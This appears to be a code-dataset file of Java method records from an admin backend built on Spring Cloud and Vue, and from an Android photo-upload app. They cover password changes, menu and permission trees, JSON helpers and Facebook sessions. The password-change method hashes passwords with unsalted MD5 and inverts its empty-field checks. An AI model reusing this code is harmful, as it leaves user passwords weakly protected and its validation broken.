{"docstring": "/**\n * \u4fee\u6539\u5bc6\u7801\n * @param currentUser \u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\n * @param old_pwd\n * @param new_pwd\n * @return \u4fee\u6539\u5931\u8d25\u8fd4\u56de\u9519\u8bef\u4fe1\u606f\uff0c\u4fee\u6539\u6210\u529f\u8fd4\u56deauthKey\u4fe1\u606f\u3002\n */\n", "func_signal": "public String setInfo(SysAdminUser currentUser, String old_pwd, String new_pwd)", "code": "{\n\tif (currentUser == null){\n\t\treturn FastJsonUtils.resultError(-400, \"\u8bf7\u5148\u767b\u5f55\", null);\n\t}\n\t\n\tif (StringUtils.isNotBlank(old_pwd)) {\n\t\treturn FastJsonUtils.resultError(-400, \"\u65e7\u5bc6\u7801\u5fc5\u586b\", null);\n\t}\n\t\n\tif(StringUtils.isNotBlank(new_pwd)) {\n\t\treturn FastJsonUtils.resultError(-400, \"\u65b0\u5bc6\u7801\u5fc5\u586b\", null);\n\t}\n\t\n\tif (old_pwd.equals(new_pwd)) {\n\t\treturn FastJsonUtils.resultError(-400, \"\u65b0\u65e7\u5bc6\u7801\u4e0d\u80fd\u4e00\u6837\", null);\n\t}\n\t\n\tif (!currentUser.getPassword().equals(DigestUtils.md5Hex(old_pwd))) {\n\t\treturn FastJsonUtils.resultError(-400, \"\u539f\u5bc6\u7801\u9519\u8bef\", null);\n\t}\n\t\n\tif (!currentUser.getPassword().equals(DigestUtils.md5Hex(old_pwd))) {\n\t\treturn FastJsonUtils.resultError(-400, \"\u539f\u5bc6\u7801\u9519\u8bef\", null);\n\t}\n\tSysAdminUser record = new SysAdminUser();\n\trecord.setId(currentUser.getId());\n\tString md5NewPwd = DigestUtils.md5Hex(new_pwd);\n\trecord.setPassword(md5NewPwd);\n\tsysAdminUserDao.updateByPrimaryKeySelective(record);\n\tString authKey = EncryptUtil.encryptBase64(currentUser.getUsername()+\"|\"+md5NewPwd, Constant.SECRET_KEY);\n\t//@TODO \u66f4\u65b0\u7f13\u5b58\u4e2dauth_key\n\treturn FastJsonUtils.resultError(200, \"\u4fee\u6539\u6210\u529f\", authKey);\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminUserService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n* \u751f\u6210json\u8fd4\u56de\u7ed3\u679c\n*/\n", "func_signal": "public static String resultSuccess(Integer code,String msg,Object data)", "code": "{\n\t\t Map<String,Object> rs= new HashMap<String,Object>();\n\t\t rs.put(\"code\",code);\n\t\t rs.put(\"msg\",StringUtils.isNotEmpty(msg)?msg:SUCCESS_MSG);\n\t\t rs.put(\"data\", data==null ? new Object() : data);\n\t\t rs.put(\"error\",\"\");\n\t\t return toString(rs);\n\t}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u9012\u5f52\u67e5\u627e\u5b50\u83dc\u5355\n * \n * @param treeMenu\n *            \u5f53\u524d\u83dc\u5355id\n * @param treeNodes\n *            \u8981\u67e5\u627e\u7684\u5217\u8868\n * @return\n */\n", "func_signal": "private SysAdminRule getChild(SysAdminRule treeMenu, List<SysAdminRule> treeNodes, int level)", "code": "{\n\tfor (SysAdminRule it : treeNodes) {\n\t\tif (treeMenu.getId().equals(it.getPid())) {\n\t\t\tif (treeMenu.getChild() == null) {\n\t\t\t\ttreeMenu.setChild(new ArrayList<>());\n\t\t\t}\n\t\t\ttreeMenu.getChild().add(getChild(it, treeNodes, level + 1));\n\t\t}\n\t}\n\treturn treeMenu;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminRuleService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u751f\u6210json\u8fd4\u56de\u7ed3\u679c\n */\n", "func_signal": "public static String resultFeatures(Integer code,String msg,Object data,SerializerFeature... feature)", "code": "{\n\tMap<String,Object> rs= new HashMap<String,Object>();\n\trs.put(\"code\",code);\n\trs.put(\"msg\",StringUtils.isNotEmpty(msg)?msg:SUCCESS_MSG);\n\trs.put(\"data\", data==null ? new Object() : data);\n\t return JSON.toJSONString(rs, feature);\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u7ed9\u6811\u72b6\u89c4\u5219\u8868\u5904\u7406\u6210 module-controller-action\n * @return treeNodes\n */\n", "func_signal": "public List<String> rulesDeal(List<SysAdminRule> treeNodes)", "code": "{\n\tList<String> ruleStr = Lists.newArrayList();\n\tif (CollectionUtils.isNotEmpty(treeNodes)) {\n\t\tfor (SysAdminRule root : treeNodes) {\n\t\t\tif (CollectionUtils.isNotEmpty(root.getChild())) {\n\t\t\t\tfor (SysAdminRule c1 : root.getChild()) {\n\t\t\t\t\tif (CollectionUtils.isNotEmpty(c1.getChild())) {\n\t\t\t\t\t\tfor (SysAdminRule c2 : c1.getChild()) {\n\t\t\t\t\t\t\truleStr.add(root.getName() + \"-\"  +c1.getName() + \"-\" + c2.getName());\n\t\t\t\t\t\t}\n\t\t\t\t\t}else {\n\t\t\t\t\t\truleStr.add(root.getName() + \"-\"  +c1.getName());\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\truleStr.add(root.getName());\n\t\t\t}\n\t\t\t\n\t\t}\n\t}\n\treturn ruleStr;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminRuleService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u83b7\u53d6\u7528\u6237\u5bf9\u5e94\u7684\u83dc\u5355\n * @param userId\n * @return\n */\n", "func_signal": "public List<SysAdminMenu> getTreeMenuByUserId(Integer userId)", "code": "{\n\t//\u67e5\u770b\u7528\u6237\u5bf9\u5e94\u672a\u7981\u7528\u7684\u83dc\u5355\n\tList<SysAdminMenu> menusList = getMenusByUserId(userId, (byte)1);\n\t//\u5904\u7406\u6811\u83dc\u5355\n\tList<SysAdminMenu> menusTreeList = this.buildByRecursiveTree(menusList);\n\treturn menusTreeList;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminMenuService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u751f\u6210json\u5b57\u7b26\u4e32\n */\n", "func_signal": "private static String toStringIncludes(Object data,String ...properties)", "code": "{\n\t PropertyFilter filter = new PropertyFilter() {\n\t      @Override\n\t\tpublic boolean apply(Object source, String name, Object value) {\n\t    \t  if(source.getClass() == HashMap.class && (\"code\".equals(name) || \"data\".equals(name) || \"msg\".equals(name))){\n\t    \t\t  return true;\n\t    \t  }\n\t    \t  for(String pro : properties){\n\t    \t\t  if(pro.equals(name)){\n\t    \t\t\t  return true;\n\t    \t\t  }\n\t    \t  }\n\t          return false;\n\t      }\n\t };\n\t return JSON.toJSONString(data, filter, features); \n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n* \u751f\u6210json\u8fd4\u56de\u7ed3\u679c\n*/\n", "func_signal": "public static String resultList(Integer code,String msg,Integer pageNo,Integer pageSize,Object data)", "code": "{\n\t\t Map<String,Object> rs= new HashMap<String,Object>();\n\t\t rs.put(\"code\",code);\n\t\t rs.put(\"msg\",StringUtils.isNotEmpty(msg)?msg:SUCCESS_MSG);\n\t\t rs.put(\"data\", data==null ? new Object() : data);\n\t\t rs.put(\"pageNo\", pageNo == null ? 0 : pageNo);\n\t\t rs.put(\"pageSize\", pageSize == null ? 10 : pageSize);\n\t\t return toString(rs);\n\t}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u6839\u636e\u7528\u6237id\u67e5\u8be2\u6240\u5c5e\u7684\u83dc\u5355\u4fe1\u606f\n * @param userId \u7528\u6237id\n * @param status \u72b6\u6001 0\uff1a\u7981\u7528\uff0c1\uff1a\u542f\u7528\uff0cnull\uff1a\u5168\u90e8\n * @return\n */\n", "func_signal": "private List<SysAdminMenu> getMenusByUserId(Integer userId, Byte status)", "code": "{\n\tList<SysAdminMenu> menusList;\n\t//\u5224\u65ad\u662f\u5426\u4e3a\u7ba1\u7406\u5458\n\tif(userId.equals(1)) {\n\t\tSysAdminMenu menu = new SysAdminMenu();\n\t\tmenu.setStatus(status);\n\t\tmenusList = this.select(menu);\n\t} else {\n\t\t//\u67e5\u8be2\u5206\u7ec4\n\t\tList<SysAdminGroup> groupsList = sysAdminGroupDao.selectByUserId(userId, status);\n\t\tStringBuffer ruleIds = new StringBuffer(); \n\t\tfor(SysAdminGroup group : groupsList) {\n\t\t\tif(ruleIds.length() == 0) {\n\t\t\t\truleIds.append(group.getRules());\n\t\t\t} else {\n\t\t\t\truleIds.append(\",\").append(group.getRules());\n\t\t\t}\n\t\t}\n\t\t//\u67e5\u8be2\u83dc\u5355\n\t\tmenusList =  sysAdminMenuDao.selectInRuleIds(ruleIds.toString(), 1);\n\t} \n\t\n\treturn menusList;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminMenuService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u6839\u636e\u7528\u6237id\u67e5\u8be2\u6240\u5c5e\u7684\u6743\u9650\u4fe1\u606f\n * @param userId \u7528\u6237id\n * @return\n */\n", "func_signal": "private List<SysAdminRule> getRulesByUserId(Integer userId)", "code": "{\n\tList<SysAdminRule> rulesList = Lists.newArrayList();\n\t//\u5224\u65ad\u662f\u5426\u4e3a\u7ba1\u7406\u5458\n\tif(userId.equals(1)) {\n\t\trulesList = sysAdminRuleDao.selectByStatus(1);\n\t} else {\n\t\t//\u67e5\u8be2\u5206\u7ec4\n\t\tList<SysAdminGroup> groupsList = sysAdminGroupDao.selectByUserId(userId, (byte) 1);\n\t\tStringBuffer ruleIds = new StringBuffer(); \n\t\tfor(SysAdminGroup group : groupsList) {\n\t\t\tif(ruleIds.length() == 0) {\n\t\t\t\truleIds.append(group.getRules());\n\t\t\t} else {\n\t\t\t\truleIds.append(\",\").append(group.getRules());\n\t\t\t}\n\t\t}\n\t\t//\u67e5\u8be2\u6743\u9650\n\t\trulesList = sysAdminRuleDao.selectInIds(ruleIds.toString(), 1);\n\t} \n\treturn rulesList;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminRuleService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u67e5\u8be2\u5bf9\u5e94\u7528\u6237Id\u7684\u83dc\u5355 \n * @param userId\n * @return\n */\n", "func_signal": "public List<Map<String, Object>> getDataList(Integer userId, Byte status)", "code": "{\n\tList<SysAdminMenu> rootSysAdminMenus = this.getMenusByUserId(userId, status);\n\tMap<String, String> fields = Maps.newHashMap();\n\tfields.put(\"cid\", \"id\");\n\tfields.put(\"fid\", \"pid\");\n\tfields.put(\"name\", \"title\");\n\tfields.put(\"fullname\", \"title\");\n\tList<Map<String, Object>> rawList = Lists.newArrayList();\n\trootSysAdminMenus.forEach((m)->{\n\t\trawList.add(BeanToMapUtil.convertBean(m));\n\t});\n\tCategory cate = new Category(fields, rawList);\n\treturn cate.getList(Integer.valueOf(\"0\"));\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminMenuService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u751f\u6210json\u8fd4\u56de\u7ed3\u679c,\u5305\u542b\u5b57\u6bb5\n */\n", "func_signal": "public static String resultExcludes(Integer code,String msg,Object data,Class<?> type,String ...properties)", "code": "{\n\t Map<String,Object> rs= new HashMap<String,Object>();\n\t rs.put(\"code\",code);\n\t rs.put(\"msg\",StringUtils.isNotEmpty(msg)?msg:SUCCESS_MSG);\n\t rs.put(\"data\", data==null ? new Object() : data);\n\t return toStringExcludes(rs,type,properties);\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u9012\u5f52\u67e5\u627e\u5b50\u83dc\u5355\n * \n * @param treeMenu\n *            \u5f53\u524d\u83dc\u5355id\n * @param treeNodes\n *            \u8981\u67e5\u627e\u7684\u5217\u8868\n * @param level\n * \t\t\t  \u7ea7\u522b\n * @return\n */\n", "func_signal": "private SysAdminMenu getChild(SysAdminMenu treeMenu, List<SysAdminMenu> treeNodes, int level)", "code": "{\n\ttreeMenu.setSelected(false);\n\ttreeMenu.setLevel(level);\n\tfor (SysAdminMenu it : treeNodes) {\n\t\tif (treeMenu.getId().equals(it.getPid())) {\n\t\t\tif (treeMenu.getChild() == null) {\n\t\t\t\ttreeMenu.setChild(new ArrayList<>());\n\t\t\t}\n\t\t\ttreeMenu.getChild().add(getChild(it, treeNodes, level + 1));\n\t\t}\n\t}\n\treturn treeMenu;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminMenuService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u751f\u6210json\u8fd4\u56de\u7ed3\u679c\n */\n", "func_signal": "public static String resultDate(Integer code,String msg,Object data,String dateFormat)", "code": "{\n\t Map<String,Object> rs= new HashMap<String,Object>();\n\t rs.put(\"code\",code);\n\t rs.put(\"msg\",StringUtils.isNotEmpty(msg)?msg:SUCCESS_MSG);\n\t rs.put(\"data\", data==null ? new Object() : data);\n\t return JSON.toJSONStringWithDateFormat(rs, dateFormat, features);\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u901a\u8fc7 createRestApi\u51fd\u6570\u6765\u6784\u5efa\u4e00\u4e2aDocketBean\n * \u51fd\u6570\u540d,\u53ef\u4ee5\u968f\u610f\u547d\u540d,\u559c\u6b22\u4ec0\u4e48\u547d\u540d\u5c31\u4ec0\u4e48\u547d\u540d\n */\n", "func_signal": "@Bean\n    public Docket createRestApi()", "code": "{\n    \treturn new Docket(DocumentationType.SWAGGER_2)\n\t\t\t.apiInfo(apiInfo())\n\t\t\t.select()\n\t\t\t.apis(RequestHandlerSelectors.basePackage(\"cloud.simple.service\"))\n\t\t\t.paths(PathSelectors.any())\n\t\t\t.build()\n\t\t\t.pathMapping(\"/\")\n\t\t\t.directModelSubstitute(LocalDate.class, String.class)\n\t\t\t.genericModelSubstitutes(ResponseEntity.class)\n\t\t\t.useDefaultResponseMessages(false)\n\t\t\t.enableUrlTemplating(true);\n    }", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\conf\\Swagger2Config.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u5217\u8868\u9875\u9762\n * @param userId \u7528\u6237id\n * @param type  \u7c7b\u578b tree,\u5176\u5b83\n * @param status \u72b6\u6001\n * @return\n */\n", "func_signal": "public List<Map<String, Object>> getDataList(Integer userId,String type)", "code": "{\n\tList<SysAdminRule> rulesList = getRulesByUserId(userId);\n\tif(type != null && \"tree\".equals(type)) {\n\t\t//\u5904\u7406\u6811\n\t\trulesList = this.buildByRecursiveTree(rulesList);\n\t\tList<Map<String, Object>> rawList = Lists.newArrayList();\n\t\trulesList.forEach((m)->{\n\t\t\tMap<String, Object> map = BeanToMapUtil.convertBean(m);\n\t\t\tmap.put(\"check\", false);\n\t\t\trawList.add(map);\n\t\t});\n\t\treturn rawList;\n\t}else {\n\t\tMap<String, String> fields = Maps.newHashMap();\n\t\tfields.put(\"cid\", \"id\");\n\t\tfields.put(\"fid\", \"pid\");\n\t\tfields.put(\"name\", \"title\");\n\t\tfields.put(\"fullname\", \"title\");\n\t\tList<Map<String, Object>> rawList = Lists.newArrayList();\n\t\trulesList.forEach((m)->{\n\t\t\trawList.add(BeanToMapUtil.convertBean(m));\n\t\t});\n\t\tCategory cate = new Category(fields, rawList);\n\t\treturn cate.getList(Integer.valueOf(\"0\"));\n\t}\n\t\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminRuleService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u6392\u9664\u5b57\u6bb5\n * @param args\n */\n", "func_signal": "private static String toStringExcludes(Object data,Class<?> type,String ...properties)", "code": "{\n\t PropertyFilter filter = new PropertyFilter() {\n\t      @Override\n\t\tpublic boolean apply(Object source, String name, Object value) {\n\t    \t  if(source.getClass() == type){\n\t\t    \t  for(String pro : properties){\n\t    \t\t\t  if(pro.equals(name)){\n\t    \t\t\t\t  return false;\n\t    \t\t\t  }\n\t    \t\t  }\n\t    \t  }\n\t    \t  return true;\n\t      }\n\t };\n\t return JSON.toJSONString(data, filter, features); \n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u6839\u636e\u7528\u6237\u540d\u83b7\u53d6rule\u6570\u7ec4\n * @param userId \u7528\u6237id\n */\n", "func_signal": "public List<SysAdminRule> getTreeRuleByUserId(Integer userId)", "code": "{\n\tList<SysAdminRule> rulesList = getRulesByUserId(userId);\n\t//\u5904\u7406\u6811\n\tList<SysAdminRule> rulesTreeList = this.buildByRecursiveTree(rulesList);\n\treturn rulesTreeList;\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\domain\\SysAdminRuleService.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "//\u6784\u5efa api\u6587\u6863\u7684\u8be6\u7ec6\u4fe1\u606f\u51fd\u6570\n", "func_signal": "@SuppressWarnings(\"deprecation\")\n\tprivate ApiInfo apiInfo()", "code": "{\n\t\treturn new ApiInfoBuilder()\n\t\t\t\t//\u9875\u9762\u6807\u9898\n\t\t\t\t.title(\"SpringCloud + vue RESTful API\")\n\t\t\t\t//\u521b\u5efa\u4eba\n\t\t\t\t.contact(\"leo.aqing\")\n\t\t\t\t//\u7248\u672c\u53f7\n\t\t\t\t.version(\"1.0\")\n\t\t\t\t//\u63cf\u8ff0\n\t\t\t\t.description(\"API \u63cf\u8ff0\")\n\t\t\t\t.build();\n\t}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\conf\\Swagger2Config.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * \u751f\u6210json\u8fd4\u56de\u7ed3\u679c,\u5305\u542b\u5b57\u6bb5\n */\n", "func_signal": "public static String resultIncludes(Integer code,String msg,Object data,String ...properties)", "code": "{\n\t Map<String,Object> rs= new HashMap<String,Object>();\n\t rs.put(\"code\",code);\n\t rs.put(\"msg\",StringUtils.isNotEmpty(msg)?msg:SUCCESS_MSG);\n\t rs.put(\"data\", data==null ? new Object() : data);\n\t return toStringIncludes(rs,properties);\n}", "path": "back-end\\cloud-vue-parent\\cloud-simple-service\\src\\main\\java\\cloud\\simple\\service\\util\\FastJsonUtils.java", "repo_name": "OptionalDay/spring-cloud-vue", "stars": 787, "license": "None", "language": "java", "size": 1752}
{"docstring": "/**\n * Used only for ORMLite\n */\n", "func_signal": "public void setTagJson(final String json)", "code": "{\n    if (null == json) {\n        return;\n    }\n\n    try {\n        JSONArray document = new JSONArray(json);\n\n        if (null == mTags) {\n            mTags = new HashSet<PhotoTag>();\n        }\n        mTags.clear();\n\n        for (int i = 0, z = document.length(); i < z; i++) {\n            mTags.add(new PhotoTag(document.getJSONObject(i)));\n        }\n    } catch (JSONException e) {\n        e.printStackTrace();\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\model\\PhotoUpload.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Constructor\n */\n", "func_signal": "public Session(Facebook fb, String uid, String name)", "code": "{\n    this.fb = fb;\n    this.uid = uid;\n    this.name = name;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\facebook\\Session.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Swap in a new Cursor, returning the old Cursor. Unlike {@link #changeCursor(Cursor)}, the\n * returned old Cursor is <em>not</em> closed.\n *\n * @param newCursor The new cursor to be used.\n * @return Returns the previously set Cursor, or null if there was not one. If the given new Cursor\n *         is the same instance is the previously set Cursor, null is also returned.\n */\n", "func_signal": "public Cursor swapCursor(Cursor newCursor)", "code": "{\n    if (newCursor == mCursor) {\n        return null;\n    }\n    Cursor oldCursor = mCursor;\n    if (oldCursor != null) {\n        if (mChangeObserver != null) {\n            oldCursor.unregisterContentObserver(mChangeObserver);\n        }\n        if (mDataSetObserver != null) {\n            oldCursor.unregisterDataSetObserver(mDataSetObserver);\n        }\n    }\n    mCursor = newCursor;\n    if (newCursor != null) {\n        if (mChangeObserver != null) {\n            newCursor.registerContentObserver(mChangeObserver);\n        }\n        if (mDataSetObserver != null) {\n            newCursor.registerDataSetObserver(mDataSetObserver);\n        }\n        mRowIDColumn = newCursor.getColumnIndexOrThrow(\"_id\");\n        mDataValid = true;\n        // notify the observers about the new cursor\n        notifyDataSetChanged();\n    } else {\n        mRowIDColumn = -1;\n        mDataValid = false;\n        // notify the observers about the lack of a data set\n        notifyDataSetChanged();\n    }\n    return oldCursor;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\util\\CursorPagerAdapter.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Used only for ORMLite\n */\n", "func_signal": "public String getTagJson()", "code": "{\n    if (getPhotoTagsCount() > 0) {\n        JSONArray document = new JSONArray();\n        for (PhotoTag tag : mTags) {\n            try {\n                document.put(tag.toJsonObject());\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n        return document.toString();\n    }\n    return null;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\model\\PhotoUpload.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Change the underlying cursor to a new cursor. If there is an existing cursor it will be closed.\n *\n * @param cursor The new cursor to be used\n */\n", "func_signal": "public void changeCursor(Cursor cursor)", "code": "{\n    Cursor old = swapCursor(cursor);\n    if (old != null) {\n        old.close();\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\util\\CursorPagerAdapter.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "// 150m\n", "func_signal": "public void onLocationChanged(Location location)", "code": "{\n           mLastLocation = location;\n           refreshPlaces();\n\n           if (Utils.newerThan(location.getTime(), TIME_THRESHOLD)\n                   && location.getAccuracy() <= DISTANCE_THRESHOLD) {\n               stopLocationListeners();\n           }\n       }", "path": "client\\src\\uk\\co\\senab\\photup\\fragments\\PlacesListFragment.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * @see android.widget.ListAdapter#getView(int, View, ViewGroup)\n */\n", "func_signal": "@Override\npublic Object instantiateItem(View container, int position)", "code": "{\n    if (!mDataValid) {\n        throw new IllegalStateException(\"this should only be called when the cursor is valid\");\n    }\n    if (!mCursor.moveToPosition(position)) {\n        throw new IllegalStateException(\"couldn't move cursor to position \" + position);\n    }\n\n    View v = newView(mContext, mCursor, (ViewGroup) container);\n    bindView(v, mContext, mCursor);\n\n    ((ViewPager) container).addView(v);\n\n    return v;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\util\\CursorPagerAdapter.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Clears the saved session data.\n */\n", "func_signal": "public static void clearSavedSession(Context context)", "code": "{\n    Editor editor = context.getSharedPreferences(KEY, Context.MODE_PRIVATE).edit();\n    editor.clear().commit();\n}", "path": "client\\src\\uk\\co\\senab\\photup\\facebook\\Session.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * Loads the session data from disk.\n */\n", "func_signal": "public static Session restore(Context context)", "code": "{\n    SharedPreferences prefs = context.getSharedPreferences(KEY, Context.MODE_PRIVATE);\n\n    Facebook fb = new Facebook(Constants.FACEBOOK_APP_ID);\n    fb.setAccessToken(prefs.getString(TOKEN, null));\n    fb.setAccessExpires(prefs.getLong(EXPIRES, 0));\n\n    String uid = prefs.getString(UID, null);\n    String name = prefs.getString(NAME, null);\n\n    if (fb.isSessionValid() && uid != null && name != null) {\n        return new Session(fb, uid, name);\n    }\n\n    return null;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\facebook\\Session.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * This is called when your application is upgraded and it has a higher version number. This allows\n * you to adjust the various data to match the new version number.\n */\n", "func_signal": "@Override\npublic void onUpgrade(SQLiteDatabase db, ConnectionSource connectionSource, int oldVersion,\n        int newVersion)", "code": "{\n    try {\n        if (Flags.DEBUG) {\n            Log.i(DatabaseHelper.class.getName(), \"onUpgrade\");\n        }\n        for (Class<?> dataClass : DATA_CLASSES) {\n            TableUtils.dropTable(connectionSource, dataClass, true);\n        }\n\n        onCreate(db, connectionSource);\n    } catch (SQLException e) {\n        Log.e(DatabaseHelper.class.getName(), \"Can't drop databases\", e);\n        throw new RuntimeException(e);\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\DatabaseHelper.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "// Maps the cropping rectangle from image space to screen space.\n", "func_signal": "private Rect computeLayout()", "code": "{\n    RectF r = new RectF(mCropRect.left, mCropRect.top, mCropRect.right, mCropRect.bottom);\n    mMatrix.mapRect(r);\n    return new Rect(Math.round(r.left), Math.round(r.top), Math.round(r.right),\n            Math.round(r.bottom));\n}", "path": "client\\src\\uk\\co\\senab\\photup\\views\\HighlightView.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "/**\n * @see android.widget.ListAdapter#getCount()\n */\n", "func_signal": "public int getCount()", "code": "{\n    if (mDataValid && mCursor != null) {\n        return mCursor.getCount();\n    } else {\n        return 0;\n    }\n}", "path": "client\\src\\uk\\co\\senab\\photup\\util\\CursorPagerAdapter.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
{"docstring": "// Determines which edges are hit by touching at (x, y).\n", "func_signal": "public int getHit(float x, float y)", "code": "{\n    Rect r = computeLayout();\n    int retval = GROW_NONE;\n    final float hysteresis = mTouchHystersis;\n\n    // verticalCheck makes sure the position is between the top and\n    // the bottom edge (with some tolerance). Similar for horizCheck.\n    boolean verticalCheck = (y >= r.top - hysteresis) && (y < r.bottom + hysteresis);\n    boolean horizCheck = (x >= r.left - hysteresis) && (x < r.right + hysteresis);\n\n    // Check whether the position is near some edge(s).\n    if ((Math.abs(r.left - x) < hysteresis) && verticalCheck) {\n        retval |= GROW_LEFT_EDGE;\n    }\n    if ((Math.abs(r.right - x) < hysteresis) && verticalCheck) {\n        retval |= GROW_RIGHT_EDGE;\n    }\n    if ((Math.abs(r.top - y) < hysteresis) && horizCheck) {\n        retval |= GROW_TOP_EDGE;\n    }\n    if ((Math.abs(r.bottom - y) < hysteresis) && horizCheck) {\n        retval |= GROW_BOTTOM_EDGE;\n    }\n\n    // Not near any edge but inside the rectangle: move.\n    if (retval == GROW_NONE && r.contains((int) x, (int) y)) {\n        retval = MOVE;\n    }\n\n    return retval;\n}", "path": "client\\src\\uk\\co\\senab\\photup\\views\\HighlightView.java", "repo_name": "chrisbanes/photup", "stars": 945, "license": "None", "language": "java", "size": 37229}
